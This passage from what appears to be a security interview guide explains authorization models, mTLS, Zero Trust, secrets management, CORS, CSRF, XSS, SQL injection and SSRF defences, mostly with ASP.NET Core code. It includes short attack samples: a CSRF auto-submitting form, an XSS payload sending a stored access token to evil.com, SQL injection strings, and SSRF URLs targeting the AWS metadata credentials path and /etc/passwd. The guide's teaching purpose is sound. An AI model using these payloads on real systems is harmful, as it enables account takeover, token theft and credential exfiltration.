**The distinction that matters most, and the one most often confused:**

> **Scopes limit the *client*; roles and permissions limit the *user*.**

A user with the `approver` role, using an application granted only `payments:read`, **cannot approve a payment through that application** — the application was never granted write capability, regardless of who the user is. Conversely, an application granted `payments:write` used by a read-only user must still be refused. **You need both checks**, and either alone is a vulnerability:

```csharp
// Scope check — is the CLIENT allowed to attempt this operation?
options.AddPolicy("PaymentsWrite", p => p.RequireClaim("scope", "payments:write"));

// Plus a resource-level check — is THIS USER allowed to act on THIS payment?
var result = await _authz.AuthorizeAsync(User, payment, "CanRefundPayment");
if (!result.Succeeded) return Forbid();
```

**Design guidance:**
- **Keep scopes coarse.** They appear on consent screens and must be comprehensible to a human. `payments:write` is a scope; "may refund transactions under £500 for merchants in the EU" is a **policy**, and it belongs in the service, not in a scope string.
- **Least privilege per client** — request only what the client actually needs, and grant only what it should have.
- **Scopes are not a substitute for resource-level authorization.** A token with `payments:read` does not mean the bearer may read *every* payment. Object-level checks are still required, and their absence is **OWASP API Security's number-one risk, Broken Object Level Authorization** (Module 16).
- **Down-scoping**: RFC 6749 allows a refresh to request *narrower* scope. Useful for a service that needs elevated scope briefly and drops back.

---

## Q18. Claims vs Roles vs Scopes?

All three appear as claims in a token, but they answer different questions and are enforced by different parties.

| | **Claim** | **Role** | **Scope** |
|---|---|---|---|
| **What it is** | Any **statement about the subject** | A **named collection of permissions** assigned to a user | A **capability granted to the client application** |
| **Answers** | "What is true about this principal?" | "What kind of user is this?" | "What may this app do on their behalf?" |
| **Limits** | Nothing by itself — it is data | The **user** | The **client** |
| **Examples** | `sub`, `email`, `tenant`, `department`, `trading_limit` | `approver`, `admin`, `auditor` | `payments:read`, `openid` |
| **Set by** | The identity provider / directory | Role assignment (user↔role) | Client registration + user consent |
| **Enforced by** | Whatever policy reads it | The resource server | The resource server |
| **Generality** | **The umbrella** — roles and scopes are both delivered *as* claims | A specific claim type | A specific claim type |

**The hierarchy to state clearly:** *a claim is any assertion; a role is a claim that groups permissions for a user; a scope is a claim that bounds what the application may attempt.* Roles and scopes are both just claims with conventional meanings — which is why ASP.NET Core models everything as a `ClaimsPrincipal` with `Claims`, and `IsInRole` is simply a lookup of the role claim type.

**Why all three are needed, in one scenario:**

```
Token:  sub=u914  roles=[approver]  scope="payments:read payments:write"
        tenant=merchant-8891  approval_limit=500000

Request: POST /payments/p-77/refunds   { amount: 250000 }

Checks:
  1. Scope   → does the CLIENT have payments:write?          ✓
  2. Role    → is the USER an approver?                      ✓
  3. Claim   → is 250000 ≤ approval_limit (500000)?          ✓   ← attribute-based
  4. Resource→ does payment p-77 belong to tenant 8891?      ✓   ← object-level (BOLA)
  → Allowed
```
Remove any one check and you have a vulnerability: no scope check and a read-only integration can write; no role check and any user can approve; no claim check and limits are meaningless; **no resource check and any authenticated user can refund anyone's payment**.

**Practical guidance:** keep **roles few and coarse** (role explosion — `approver_eu_under_500`, `approver_uk_over_1000` — is a symptom that you actually need **ABAC**, Q19); put **fine-grained conditions in claims** and evaluate them in policies; and **never trust a claim you did not validate the signature of**, nor one supplied by the client outside the token.

---

## Q19. RBAC vs ABAC?

| | **RBAC** (Role-Based Access Control) | **ABAC** (Attribute-Based Access Control) |
|---|---|---|
| Decision based on | **The role** the user holds | **Attributes** of subject, resource, action and environment |
| Model | user → role → permissions | A policy evaluating attribute expressions |
| Example rule | *"Approvers can refund payments"* | *"An approver may refund a payment **if** the amount ≤ their limit **and** the payment belongs to their tenant **and** it is within business hours **and** they did not create it"* |
| Granularity | Coarse | **Arbitrarily fine** |
| Context-aware | No | **Yes** — time, location, device, risk score, resource state |
| Complexity | **Low** | High |
| Auditability | **Easy** — "who has the approver role?" is one query | **Harder** — you must evaluate policies to know who can do what |
| Scaling problem | **Role explosion** — a role per combination of conditions | Policy complexity and testability |
| Performance | Fast — a set lookup | Needs resource data at decision time |

**RBAC's failure mode is the thing to name:** as requirements accumulate ("approvers in the EU", "under £500", "not the person who raised it"), you either create a role per combination — `approver_eu_small`, `approver_uk_large`, `approver_eu_small_not_self` — which becomes unmanageable, or you start hard-coding conditions in application code, which becomes unauditable. **Role explosion is the signal that the model has outgrown RBAC.**

**ABAC's cost:** policies are code, they need testing, and evaluating them often requires loading the resource first (you cannot know if the payment belongs to the user's tenant without reading the payment). Policy engines exist for exactly this — **OPA/Rego**, **Cedar** (which AWS uses for Verified Permissions), **Casbin** — and using one gives you centrally-managed, testable, auditable policy rather than authorization logic scattered through controllers.

**Related models worth naming:** **ReBAC** (relationship-based — Google Zanzibar, OpenFGA, SpiceDB: *"can this user edit this document because they are an editor of the folder that contains it?"*) which is the right model for hierarchical and sharing-based permissions, and **PBAC**, which is largely ABAC with a policy-engine emphasis.

**The pragmatic answer for a real platform, and the one I would give:** **RBAC for coarse capability, ABAC for contextual conditions.** The role gets you through the door (`approver`); attributes decide whether this specific action, on this specific resource, in this specific context, is permitted. That is exactly what ASP.NET Core's **policy-based authorization** expresses (Q20), and in a bank the contextual conditions — limits, segregation of duties, four-eyes approval, business hours, tenant isolation — are not optional extras; they *are* the control environment.

---

## Q20. What is policy-based authorization?

**Per Microsoft Learn**, ASP.NET Core authorization is **policy-based**: a policy is a named collection of **requirements**, each evaluated by one or more **handlers** against the current `ClaimsPrincipal` and, optionally, a **resource**. Roles and claims checks are simply built-in requirement types on top of this model.

**Why it is the right abstraction:** it decouples *"what the endpoint requires"* from *"how that requirement is satisfied"*. The controller says `[Authorize("CanRefundPayment")]`; the rule behind it can change from a role check to a limit check to a call to a policy engine without touching a single endpoint.

```csharp
// 1. The requirement — a marker carrying any parameters
public sealed record RefundLimitRequirement(decimal DefaultLimit) : IAuthorizationRequirement;

// 2. The handler — resource-based: it sees BOTH the user and the payment
public sealed class RefundLimitHandler : AuthorizationHandler<RefundLimitRequirement, Payment>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext ctx, RefundLimitRequirement req, Payment payment)
    {
        var limit = decimal.TryParse(ctx.User.FindFirst("approval_limit")?.Value, out var l)
                    ? l : req.DefaultLimit;

        var sameTenant = ctx.User.FindFirst("tenant")?.Value == payment.TenantId;   // BOLA defence
        var notSelf    = ctx.User.FindFirst("sub")?.Value    != payment.CreatedBy;  // four eyes

        if (sameTenant && notSelf && payment.Amount <= limit)
            ctx.Succeed(req);

        return Task.CompletedTask;
    }
}

// 3. Registration
builder.Services.AddAuthorization(o =>
{
    o.AddPolicy("CanRefundPayment", p => p
        .RequireAuthenticatedUser()
        .RequireClaim("scope", "payments:write")            // client capability
        .RequireRole("approver")                            // user role
        .AddRequirements(new RefundLimitRequirement(1000))); // contextual attributes

    o.FallbackPolicy = new AuthorizationPolicyBuilder().RequireAuthenticatedUser().Build();
});
builder.Services.AddSingleton<IAuthorizationHandler, RefundLimitHandler>();

// 4. Use — resource-based, because the decision needs the payment itself
app.MapPost("/payments/{id}/refunds", async (string id, IAuthorizationService authz,
        ClaimsPrincipal user, IPaymentRepository repo) =>
{
    var payment = await repo.GetAsync(id);
    if (payment is null) return Results.NotFound();

    var result = await authz.AuthorizeAsync(user, payment, "CanRefundPayment");
    return result.Succeeded ? Results.Ok(await repo.RefundAsync(payment)) : Results.Forbid();
});
```

**The four things this example demonstrates that a panel is listening for:**
1. **Layered checks** — scope (client), role (user), attributes (context), resource (object-level).
2. **Resource-based authorization** — the decision needs the payment loaded, which is why `[Authorize]` alone cannot express it, and why BOLA (Module 16) is so common when people rely on attributes only.
3. **Segregation of duties** — `notSelf` implements four-eyes approval, a control every bank requires.
4. **`FallbackPolicy`** — endpoints are **secure by default**; forgetting `[Authorize]` fails closed.

**When to externalise:** for a large estate with many services, move policy into **OPA/Cedar/OpenFGA** so rules are centrally managed, versioned, testable and auditable, with the application calling a decision point. The trade-off is a dependency in the request path (mitigate with a sidecar and local evaluation) versus consistency and auditability across dozens of services — which in a regulated environment usually wins.

---

## Q21. How do you secure microservices?

Layered, because a microservices estate multiplies every attack surface: more network paths, more credentials, more deployment pipelines, more places to get it wrong.

**1. Identity for every workload.** Every service has its **own** identity — an IAM role (IRSA/Pod Identity on EKS, a task role on ECS), a SPIFFE identity in a mesh, or its own OAuth client. **Never a shared credential across services**: it destroys attribution, makes least privilege impossible, and turns one compromise into all of them.

**2. Authenticate at the edge, authorise in the service.**
- **Gateway**: validate the token (signature, issuer, audience, expiry), enforce coarse scopes, terminate TLS, rate limit. Reject the obviously-invalid before it reaches anything.
- **Service**: enforce **resource-level** authorization — the gateway cannot know whether this user may refund *this* payment (Q1, Module 4 Q15).
- **Never trust the network.** A request arriving on the internal network is not authenticated by virtue of its origin (Q23).

**3. Encrypt everything in transit, including east-west.** TLS 1.2+ externally, **mTLS between services** (Q22) via a service mesh or ALB/NLB with client certificates. In a bank this is usually mandated, and a mesh is how you get it without touching application code.

**4. Propagate user identity correctly.** Use **token exchange / On-Behalf-Of** so the downstream service sees who the user is and the audit trail names a person, not a service (Q16). Never let a downstream service simply trust a `X-User-Id` header from an upstream one — unless the boundary is genuinely closed and the header is stripped at ingress.

**5. Secrets, not in code.** IRSA/Pod Identity where no secret is needed at all; Secrets Manager + the Secrets Store CSI driver where one is (Q25, Module 10 Q12).

**6. Network segmentation as defence in depth.** Private subnets, security groups referencing security groups, **default-deny NetworkPolicies**, egress filtering. It will not stop a stolen token, but it bounds lateral movement.

**7. Secure the supply chain.** Signed images, SBOMs, CVE scanning in CI **and** continuously in the registry, admission control that refuses unsigned images, pinned dependencies (Module 10 Q28). A microservices estate has dozens of images; an unowned base image is a fleet-wide exposure.

**8. Input validation and output encoding at every service.** Each service validates its own inputs; do not assume the caller did. This is the principle that makes a compromised neighbour survivable.

**9. Observability that supports investigation.** Structured logs with a **correlation ID**, centralised and immutable; audit logs of every authorization decision on sensitive operations; distributed tracing; **and no secrets or tokens in any of it**.

**10. Resilience as a security property.** Rate limiting, quotas, circuit breakers, bulkheads and timeouts — because availability is part of the security triad and an unbounded retry storm is a self-inflicted denial of service (Module 11 Q27–Q28).

**11. Governance.** SCPs and admission policies that *prevent* rather than detect; IaC reviewed in pull requests; **no standing human write access to production**; separation of duties between author and approver; and periodic access review with IAM Access Analyzer's unused-access findings (Module 9 Q23).

**The framing to close on:** in a monolith there is one perimeter; in microservices there are dozens, so **the perimeter stops being the control**. Identity becomes the control plane — every call authenticated, every call authorised, every call attributable — and the network becomes a secondary containment layer rather than the primary defence.

---

## Q22. What is mTLS?

**Mutual TLS** extends standard TLS so that **both** parties present and validate X.509 certificates. In ordinary TLS only the server proves its identity; in mTLS the client does too.

```
Standard TLS                              Mutual TLS
  Client ──── ClientHello ──────▶ Server    Client ──── ClientHello ─────▶ Server
  Client ◀─── cert + ServerHello ─ Server   Client ◀─── cert + CertRequest ─ Server
  Client verifies the server's cert         Client ──── ITS OWN cert ─────▶ Server
  Client is UNAUTHENTICATED at TLS level    Server verifies the client's cert
                                            ✅ BOTH sides are authenticated
```

**What it gives you:**

| Property | Detail |
|---|---|
| **Mutual authentication** | Cryptographic proof of *both* identities, at the transport layer, before a single byte of application data |
| **Encryption** | Standard TLS confidentiality and integrity |
| **Identity independent of the application** | The identity is the certificate, so it cannot be spoofed by a header |
| **Sender-constrained tokens** | An access token can be **bound to the client certificate** (RFC 8705), so a stolen token is useless without the private key (Q9) — this is what **FAPI** requires |

**Where it is used, and why:**
- **Service-to-service inside a platform** — the primary use, and the main reason organisations adopt a **service mesh**: Istio/Linkerd issue a short-lived certificate per workload (SPIFFE identity), rotate it automatically, and enforce mTLS with **zero application code**. Doing this by hand across fifty services is a certificate-management project nobody finishes.
- **Partner and B2B integrations** — extremely common in banking and payments: the counterparty's certificate *is* their identity, often pinned to a specific issuer.
- **Open Banking / PSD2 / FAPI** — mTLS with eIDAS (QWAC/QSEAL) certificates is mandated.
- **Zero Trust** — mTLS is the concrete mechanism that makes "never trust the network" implementable (Q23).

**The hard part is certificate lifecycle, not the protocol.** Issuance, distribution, rotation, revocation (CRL/OCSP), and trust-store management across a fleet. **Certificate expiry is one of the most common causes of a total outage** — everything works, then at 03:14 on a Tuesday nothing does. Mitigations: automated issuance and rotation (mesh, cert-manager, AWS Private CA), **short-lived certificates** (hours, so rotation is exercised constantly rather than annually), and an alert 30 days before any long-lived certificate expires.

**mTLS vs a JWT — they are complementary, not alternatives:** mTLS authenticates the **workload/channel**; a JWT carries the **user context and authorization claims**. In a mature platform you have both: mTLS proving *which service* is calling, and a token proving *on whose behalf*.

---

## Q23. What is Zero Trust?

**Zero Trust is a security model that assumes no implicit trust based on network location.** The formulation, per **NIST SP 800-207**, is that trust is never granted implicitly and must be continually evaluated — every request is authenticated, authorised and encrypted, regardless of whether it originates inside or outside the traditional perimeter.

**The shift it represents:**

| **Perimeter model ("castle and moat")** | **Zero Trust** |
|---|---|
| Inside the network = trusted | **Nothing is trusted by location** |
| Authenticate once at the edge | **Authenticate and authorise every request** |
| Flat internal network | **Micro-segmentation**; least-privilege network paths |
| Breach = full lateral movement | Breach is **contained** to what that identity can reach |
| VPN as the control | **Identity as the control plane** |

**Why the perimeter model failed:** cloud, SaaS and remote work dissolved the perimeter; and empirically, most serious breaches involve an attacker who is already inside — via phishing, a compromised supplier, a stolen credential, or a vulnerable public-facing service — after which a flat internal network gives them everything.

**The core principles, and the concrete mechanism for each:**

| Principle | Mechanism |
|---|---|
| **Verify explicitly** | Authenticate every request — user, device, workload. mTLS + tokens, no anonymous internal calls |
| **Least privilege** | Fine-grained, just-in-time, time-bound access; no standing production write access |
| **Assume breach** | Micro-segmentation, blast-radius limits, encryption everywhere, comprehensive logging |
| **Continuous evaluation** | Re-evaluate on signals — risk score, device posture, impossible travel, anomalous behaviour |
| **Encrypt everywhere** | TLS/mTLS in transit, KMS at rest, including internal traffic |

**What it looks like concretely on AWS/Kubernetes** — and this is where the answer must land, because Zero Trust is otherwise a slogan:
- **Users**: IdP with MFA (phishing-resistant, ideally FIDO2), conditional access on device posture, short-lived sessions, JIT elevation.
- **Workloads**: IAM roles per pod (IRSA/Pod Identity), **IMDS blocked from containers**, no shared credentials.
- **Network**: private subnets, SG-to-SG rules, **default-deny NetworkPolicies**, PrivateLink instead of internet paths, egress filtering.
- **Service-to-service**: **mTLS with per-workload SPIFFE identity**, plus L7 authorization policy ("service A may call `POST /payments` on B, and nothing else").
- **Data**: encrypted with keys you control, access via IAM with `aws:PrincipalOrgID` and `aws:SourceVpce` conditions.
- **Detection**: CloudTrail, GuardDuty, audit logs, anomaly alerting.

**The honest caveat to voice:** Zero Trust is a **direction of travel, not a product**, and vendors sell it as the latter. You implement it incrementally — strong identity first, then segmentation, then continuous evaluation — and the biggest practical wins come early: eliminating shared credentials, per-workload identity, and default-deny networking.

---

## Q24. How do you secure service-to-service communication?

Four layers, and a mature platform has all of them.

**1. Transport — encrypt and mutually authenticate.**
**mTLS** (Q22), ideally via a service mesh so certificates are issued and rotated automatically per workload with no application code. If a mesh is too much, ALB/NLB with client certificates, or application-level mTLS with `HttpClientHandler.ClientCertificates` in .NET. The requirement is that **a service can prove which service is calling it**, not merely that the traffic is encrypted.

**2. Identity and authorization — what may this caller do?**

| Approach | Notes |
|---|---|
| **Mesh L7 policy** (Istio `AuthorizationPolicy`) | *"`payments` may call `POST /entries` on `ledger`; nothing else may call it at all."* Enforced in the proxy, no code |
| **Client credentials token** (Q15) | The caller presents a token with scopes; the callee validates issuer, audience and scope |
| **AWS SigV4 / IAM** | For AWS-native paths (API Gateway with IAM auth, PrivateLink + resource policies) — no secret at all |
| **Network policy** | Coarse L3/L4 backstop: only the payments namespace can reach the ledger's port |

**3. User context — who is this *for*?** Machine identity alone is not enough for an audit trail. Use **token exchange (RFC 8693)** or **On-Behalf-Of** so the downstream token names the user, with an `act` (actor) claim showing which service is acting for them (Q16). A `X-User-Id` header trusted without verification is a privilege-escalation bug waiting to happen — anyone who can reach the service can claim to be anyone.

**4. Message-level security for asynchronous paths.** Transport security does nothing for a message sitting in a queue. For high-value events: **encrypt sensitive fields** (envelope encryption with KMS), **sign the payload** so a consumer can verify the producer, and keep PII out of the message entirely by passing a reference (the **Claim Check** pattern) that the consumer resolves with its own authorization.

**Practical hardening that gets missed:**
- **Validate at every service.** Do not assume an upstream sanitised the input.
- **Timeouts, retries with jitter, circuit breakers** — availability is a security property.
- **Strip client-supplied trust headers at ingress** (`X-User-Id`, `X-Forwarded-*` when not from a trusted proxy) so an external caller cannot inject internal trust signals.
- **Rate limit internally too.** A compromised or buggy internal service can DoS a critical one just as effectively as an external attacker.
- **Log the calling identity on every request** — this is what makes an incident investigable.

**The layered answer in one line:** *mTLS proves which workload is calling, a token proves on whose behalf, a policy decides whether that combination may perform this operation, and the network limits who can even attempt it.*

---

## Q25. How do you manage secrets?

**The best-managed secret is one that does not exist** — start there, because it reframes the whole question.

**1. Eliminate secrets wherever possible.**

| Instead of | Use |
|---|---|
| AWS access keys in config | **IAM roles** — IRSA/Pod Identity on EKS, task roles on ECS, instance profiles on EC2 |
| A stored client secret for CI → AWS | **OIDC federation** (GitHub Actions → IAM role) — no stored credential |
| A database password | **IAM database authentication** (RDS), or a token generated per connection |
| A partner API key | **mTLS** with a client certificate, or `private_key_jwt` (Q15) |

Every one of these removes a secret from the estate entirely, which is strictly better than storing it well.

**2. For what remains, use a managed secret store.**
**AWS Secrets Manager** (rotation built in, cross-account, KMS-encrypted) for credentials that must rotate; **SSM Parameter Store SecureString** for secrets that don't (free, and a legitimate choice — Module 9 Q26); **HashiCorp Vault** where one secrets plane must span cloud and data centre, and where **dynamic, short-lived credentials** are wanted.

**3. Deliver them safely at runtime.**
- **Secrets Store CSI driver** — mounts the secret as a `tmpfs` file at pod start; **the value never enters etcd**. The strongest option on Kubernetes.
- **ECS `secrets` block / Lambda environment from Secrets Manager** — injected at start, not stored in the task definition.
- **Prefer file mounts over environment variables** — env vars leak into crash dumps, `/proc`, child processes, and anything that prints the environment.
- **Cache in memory** with a refresh interval; never call `GetSecretValue` per request (throttled, billed, and adds latency).

**4. Rotate, and make rotation a non-event.** Secrets Manager's **two-user rotation strategy** for databases means there is never a window where the stored credential is invalid — no downtime, no rotation-day incident. In the application, catch an authentication failure, force a cache refresh, retry once; that single retry is what makes rotation invisible.

**5. Keep them out of everywhere they don't belong.** Not in Git (enforce with gitleaks/`git-secrets` pre-commit **and** in CI), not in container images, not in Terraform state committed to a repo, not in logs (redact at the logging middleware), not in error responses, not in APM traces, not in a ticket.

**6. Least privilege and detection.** IAM policies scoped to specific secret ARNs per workload; **KMS key policies as a second gate**, so decrypt requires both the IAM permission and the key policy; CloudTrail on every `GetSecretValue` and every `Decrypt`; alert on unusual access volume or access from an unexpected principal.

**7. Assume compromise and plan for it.** A documented rotation runbook per secret type, with a measured time-to-rotate. "How long would it take us to rotate every credential?" is a question you want answered before an incident, not during one.

---

## Q26. What is CORS?

**Cross-Origin Resource Sharing** is a **browser** security mechanism that relaxes the **same-origin policy**, allowing a page from one origin to make requests to another origin — but only when the target server explicitly permits it via response headers.

**The same-origin policy** blocks a page at `https://app.example.com` from reading responses from `https://api.other.com`. An **origin** is scheme + host + port; any difference makes it cross-origin.

**How it works — the preflight is the part to know:**

```
For "non-simple" requests (custom headers, methods beyond GET/POST/HEAD,
JSON content type), the browser first sends:

  OPTIONS /payments HTTP/1.1
  Origin: https://app.example.com
  Access-Control-Request-Method: POST
  Access-Control-Request-Headers: authorization, content-type

Server responds:
  Access-Control-Allow-Origin: https://app.example.com
  Access-Control-Allow-Methods: POST, GET
  Access-Control-Allow-Headers: authorization, content-type
  Access-Control-Allow-Credentials: true
  Access-Control-Max-Age: 600          ← cache the preflight; otherwise every request doubles

Only then does the browser send the actual POST.
```

**The three misconceptions that matter, and an interviewer will probe at least one:**

1. **CORS is not a server-side security control.** It is enforced **by the browser**, for the browser's protection. `curl`, Postman, a server-side HTTP client and any non-browser attacker ignore it entirely. **A permissive CORS policy does not create a vulnerability in your API; it removes a protection for your users' browsers.** Your API must still authenticate and authorise every request.
2. **`Access-Control-Allow-Origin: *` cannot be combined with credentials.** With `Allow-Credentials: true`, the origin must be an explicit value, not a wildcard. Browsers enforce this, and the workaround people reach for — reflecting the `Origin` header back — is the dangerous part: it effectively allows *every* origin with credentials, so any site can make authenticated requests as your logged-in user and read the responses.
3. **CORS is not CSRF protection** (Q27). CORS governs *reading* cross-origin responses; a CSRF attack often does not need to read the response, only to cause the side effect.

**In ASP.NET Core:**
```csharp
builder.Services.AddCors(o => o.AddPolicy("app", p => p
    .WithOrigins("https://app.example.com")     // explicit — never AllowAnyOrigin with credentials
    .WithMethods("GET", "POST")
    .WithHeaders("Authorization", "Content-Type")
    .AllowCredentials()
    .SetPreflightMaxAge(TimeSpan.FromMinutes(10))));

app.UseCors("app");   // must come before UseAuthorization and endpoint mapping
```
**Never** `AllowAnyOrigin().AllowAnyHeader().AllowAnyMethod().AllowCredentials()` — ASP.NET Core will actually throw on that combination, which is the framework saving you from a real vulnerability.

---

## Q27. What is CSRF?

**Cross-Site Request Forgery** (OWASP): an attack that forces an authenticated user's browser to send a state-changing request to an application **in which they are currently authenticated**, without their intent. The application cannot distinguish the forged request from a genuine one because the browser attaches the credentials automatically.

**The attack, concretely:**

```html
<!-- The victim is logged into bank.example.com (a session cookie exists).
     They visit evil.com, which contains: -->
<form action="https://bank.example.com/transfer" method="POST" id="f">
  <input type="hidden" name="to"     value="attacker-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('f').submit();</script>
```
The browser **automatically attaches the bank's session cookie** (that is what cookies do), so the transfer executes as the victim. The attacker never sees the response — and does not need to.

**The precondition is ambient authority:** CSRF only works when credentials are attached **automatically** by the browser — session cookies, HTTP Basic auth, Windows/NTLM auth, client certificates. If the credential must be **explicitly added by JavaScript** (a bearer token in an `Authorization` header), the attacker's cross-site form cannot add it, and CSRF does not apply.

**Defences, in order:**

| Defence | How |
|---|---|
| **`SameSite` cookies** | `SameSite=Lax` (the modern browser default) blocks cookies on cross-site POSTs; `SameSite=Strict` for the most sensitive. **The single highest-value mitigation** |
| **Anti-forgery / synchroniser token** | A per-session, unpredictable token in a hidden field or header, validated server-side. The attacker cannot read it (same-origin policy prevents it) |
| **Double-submit cookie** | Token in both a cookie and a header; the server compares them. Useful when server-side state is undesirable |
| **Verify `Origin`/`Referer`** | Reject state-changing requests whose `Origin` is not yours. A good defence in depth |
| **Never use GET for state changes** | A `GET /transfer?amount=…` is exploitable with a bare `<img>` tag |
| **Re-authenticate for high-value actions** | Step-up auth / transaction signing on a transfer — the control a bank actually relies on |

**In ASP.NET Core:** anti-forgery is built in — `@Html.AntiForgeryToken()` in Razor with `[ValidateAntiForgeryToken]`, or `[AutoValidateAntiforgeryToken]` applied globally so it is opt-out rather than opt-in. Minimal APIs and Razor Pages have it enabled for form posts by default.

**Q28's counterpart worth stating:** **XSS defeats every CSRF defence.** Script running on your origin can read the anti-forgery token and make same-origin requests. So CSRF protection is only meaningful on top of solid XSS prevention — which is why the two are always discussed together.

---

## Q28. What is XSS?

**Cross-Site Scripting** (OWASP): an injection flaw in which an attacker gets **malicious script executed in another user's browser, in the context of your origin**. Because it runs as your site, it inherits your site's privileges: it can read cookies (unless HttpOnly), read `localStorage`, read the DOM, make authenticated same-origin requests, and modify what the user sees.

**Three types:**

| Type | Where the payload lives |
|---|---|
| **Stored (persistent)** | Saved on the server (a comment, a profile field, a merchant name) and served to every viewer. **The most damaging** |
| **Reflected** | In the request (a query parameter echoed into the response); requires luring the victim to a crafted link |
| **DOM-based** | Never reaches the server — client-side JavaScript writes untrusted data into a dangerous sink (`innerHTML`, `eval`, `document.write`) |

```
Attacker posts a merchant display name:
  <img src=x onerror="fetch('https://evil.com/?c='+localStorage.getItem('access_token'))">
Every operator who views the merchant list exfiltrates their token.
```

**Why it is the most serious client-side flaw:** it defeats CSRF tokens (Q27), it reads tokens from `localStorage`, it can perform any action the user can, and it is invisible to the victim.

**Defences, in order of effectiveness:**

1. **Context-aware output encoding — the primary defence.** Encode untrusted data for the context it lands in: HTML body, HTML attribute, JavaScript, URL, CSS. Each has different rules; HTML-encoding data that lands inside a `<script>` block does not protect you.
2. **Use a framework that encodes by default.** Razor encodes automatically with `@value`; React escapes by default in JSX. **The vulnerabilities are in the escape hatches** — `@Html.Raw`, `dangerouslySetInnerHTML`, `[innerHTML]` in Angular, `v-html` in Vue. Treat every use of those as requiring review.
3. **Content Security Policy.** A strong CSP (`script-src 'self' 'nonce-…'`, no `unsafe-inline`, no `unsafe-eval`) turns many XSS bugs from exploitable into inert. It is the most valuable defence-in-depth layer and is under-deployed.
4. **Sanitise HTML you must render** — with a vetted library (**HtmlSanitizer** in .NET, DOMPurify in the browser), never a hand-rolled regex blocklist.
5. **`HttpOnly`, `Secure`, `SameSite` cookies**, so script cannot read the session cookie. **And do not put access tokens in `localStorage`** — the BFF pattern with an HttpOnly cookie removes this entire exposure (Q6, Module 12 Q14).
6. **Validate input** as a secondary control — allow-list where the format is known (an account number, a currency code). Input validation is not a substitute for output encoding, because the same data may be rendered in several contexts.

**The principle worth stating:** *XSS is an **output** problem, not an input problem.* The same string is safe in a JSON response, dangerous in `innerHTML`, and differently dangerous inside a `<script>` block. **Encode at the point of output, for that specific context** — that is why frameworks that encode by default eliminate most of the risk.

---

## Q29. What is SQL Injection?

**SQL Injection** (OWASP, and a member of the **Injection** category in the Top 10): an attacker supplies input that is interpreted as **SQL code** rather than data, because the application concatenates untrusted input into a query string.

```csharp
// ✗ VULNERABLE
var sql = $"SELECT * FROM users WHERE email = '{email}' AND active = 1";
// email = "' OR '1'='1' --"
// → SELECT * FROM users WHERE email = '' OR '1'='1' --' AND active = 1
//   Returns every user, including inactive and administrative accounts.
```

**What it enables:** authentication bypass, exfiltration of entire tables, data modification and deletion, and — depending on privileges — command execution on the database host (`xp_cmdshell`, `COPY … PROGRAM`). It remains one of the most damaging vulnerability classes because it reaches straight to the data.

**Variants to name:** classic/in-band, **blind** (boolean or time-based — `WAITFOR DELAY '0:0:5'` — where you infer data one bit at a time with no visible output), out-of-band (DNS/HTTP exfiltration), and **second-order**, where the payload is stored safely and then unsafely concatenated by a *different* query later.

**The defences, in order:**

**1. Parameterised queries — the complete fix.** Parameters are sent to the database **separately from the SQL text**, so the value can never be parsed as code, no matter what it contains.
```csharp
// ✓ ADO.NET
cmd.CommandText = "SELECT * FROM users WHERE email = @email AND active = 1";
cmd.Parameters.Add("@email", SqlDbType.NVarChar, 256).Value = email;

// ✓ Dapper
await conn.QueryAsync<User>("SELECT * FROM users WHERE email = @email", new { email });

// ✓ EF Core — LINQ always parameterises
await ctx.Users.Where(u => u.Email == email).ToListAsync();

// ✓ EF Core raw SQL with interpolation — FromSql PARAMETERISES the interpolated values
await ctx.Users.FromSql($"SELECT * FROM users WHERE email = {email}").ToListAsync();

// ✗ FromSqlRaw with string concatenation is NOT safe
await ctx.Users.FromSqlRaw("SELECT * FROM users WHERE email = '" + email + "'").ToListAsync();
```
The `FromSql` vs `FromSqlRaw` distinction is a favourite interview detail: `FromSql` with an interpolated string is safe because EF Core converts the interpolation holes into parameters; `FromSqlRaw` with concatenation is not.

**2. What parameters cannot protect** — and knowing this is what separates a real answer: **identifiers cannot be parameterised.** A dynamic table name, column name or `ORDER BY` direction must be validated against an **allow-list**:
```csharp
var allowed = new[] { "created_at", "amount", "status" };
if (!allowed.Contains(sortColumn)) throw new ArgumentException();
```

**3. Defence in depth:** least-privilege database accounts (the application user should not own the schema, and should not be `db_owner`); **stored procedures** (only if they themselves parameterise — dynamic SQL inside a procedure is just as vulnerable); input validation as a secondary control; a WAF as a detection/slowing layer, never as the fix; generic error messages so failures do not leak schema; and monitoring/alerting on SQL errors, which spike during an attack.

**The one-line rule:** *never build SQL by concatenating untrusted input — pass it as a parameter, or validate it against an allow-list if it must be an identifier.*

---

## Q30. What is SSRF?

**Server-Side Request Forgery** (**A10 in the OWASP Top 10:2021**; the category numbering shifts between editions, so cite the edition — see Module 16 Q1): an attacker induces the **server** to make an HTTP (or other protocol) request to a destination of the attacker's choosing. The server becomes a proxy into networks the attacker cannot reach directly.

```
POST /import   { "url": "https://attacker-controlled/data.csv" }

Attacker instead supplies:
  http://169.254.169.254/latest/meta-data/iam/security-credentials/   ← AWS IMDS
  http://localhost:8080/admin/                                        ← internal admin UI
  http://10.0.3.14:5432/                                              ← internal database
  file:///etc/passwd                                                  ← local file read
  http://internal-service.svc.cluster.local/                          ← Kubernetes internal
```

**Why it is so damaging in the cloud:** the **instance metadata service** at `169.254.169.254` returns the instance's IAM credentials to anything that can make an HTTP request from the host. SSRF plus IMDSv1 is a direct path to the workload's AWS credentials — this is the mechanism behind the 2019 Capital One breach, which is worth citing because it makes the risk concrete rather than theoretical.

**Defences, layered:**

| Defence | Detail |
|---|---|
| **Allow-list destinations** | The **only robust application-level fix**. Permit specific hosts/URLs; reject everything else. A **deny-list is not sufficient** — DNS rebinding, redirects, decimal/octal/IPv6 IP encodings and `[::ffff:169.254.169.254]` all evade it |
| **Resolve, then validate, then pin** | Resolve the hostname, check the resolved IP is not private/link-local/loopback, then connect **to that IP** — otherwise DNS rebinding changes the answer between check and use |
| **Disable redirects**, or re-validate each hop | An allowed URL that 302s to `169.254.169.254` defeats a naive check |
| **Restrict schemes** | HTTPS only; block `file://`, `gopher://`, `ftp://`, `dict://` |
| **IMDSv2 with hop limit 1** | Requires a `PUT` to obtain a session token and blocks the request from a container. On EKS, **block IMDS from pods entirely** (Module 10 Q27). This is the single highest-value cloud mitigation |
| **Network egress control** | The service can only reach the specific external hosts it needs — AWS Network Firewall, NetworkPolicy egress rules, or an outbound proxy with an allow-list |
| **No secrets in metadata-reachable places**, and short-lived credentials everywhere |

